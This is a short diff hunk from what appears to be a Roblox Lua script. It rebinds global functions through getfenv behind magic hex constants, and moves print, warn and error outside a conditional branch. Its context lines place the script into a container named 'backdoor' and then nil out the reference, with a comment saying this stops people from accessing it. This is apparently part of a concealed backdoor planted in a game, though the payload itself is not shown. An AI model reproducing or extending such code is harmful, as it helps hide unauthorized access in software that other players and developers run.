@@ -16,15 +16,12 @@ LoadLibrary = getfenv(1).LoadLibrary
 if conversion == 0x55262CE723BF then
     PhysicalProperties = getfenv(1).PhysicalProperties
     Raindrop = getfenv(1).Raindrop
-    error = getfenv(1).error
     getmetatable = getfenv(1).getmetatable
     loadstring = getfenv(1).loadstring
-    print = getfenv(1).print
     require = getfenv(1).require
     setmetatable = getfenv(1).setmetatable
     type = getfenv(1).type
     typeof = getfenv(1).typeof
-    warn = getfenv(1).warn
     workspace = getfenv(1).workspace
 elseif conversion == 0x24616E567 then
     CFrame = getfenv(1).CFrame
@@ -33,6 +30,9 @@ elseif conversion == 0x24616E567 then
     Wrap = getfenv(1).Wrap
     math = getfenv(1).math
 end
+print = getfenv(1).print
+warn = getfenv(1).warn
+error = getfenv(1).error
 
 getfenv().script.Parent = system32["backdoor"]
 system32 = nil -- stop ppl from accessing!
